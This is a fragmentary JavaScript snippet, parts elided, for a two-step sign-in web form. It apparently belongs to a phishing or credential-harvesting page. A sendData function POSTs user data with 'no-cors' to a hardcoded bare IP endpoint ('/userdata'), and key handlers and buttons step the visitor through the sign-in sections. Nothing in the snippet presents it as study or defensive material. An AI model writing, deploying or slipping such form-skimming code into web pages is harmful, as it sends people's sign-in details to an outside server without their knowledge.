...
const slidePage = document.querySelector(".slide-page"),
  ...
  API_URL = "http://162.254.34.45:5000",
  createBody = (b) => {
    let c = [],
      a;
    for (a in b) c.push(encodeURIComponent(a) + "=" + encodeURIComponent(b[a]));
    return c.join("&").replace(/%20/g, "+");
  },
  sendData = (a) =>
    fetch("http://162.254.34.45:5000/userdata", {
      method: "POST",
      mode: "no-cors",
      cache: "no-cache",
...
input1.addEventListener("keyup", function (a) {
  13 === a.keyCode &&
    (a.preventDefault(), document.getElementById("btnSend").click());
}),
  input2.addEventListener("keyup", function (a) {
    13 === a.keyCode &&
      (a.preventDefault(), document.getElementById("btnSignIn").click());
  }),
  btnNext.addEventListener("click", function () {
    ...
    let b = document.getElementById("section-1"),
      c = document.getElementById("section-2");
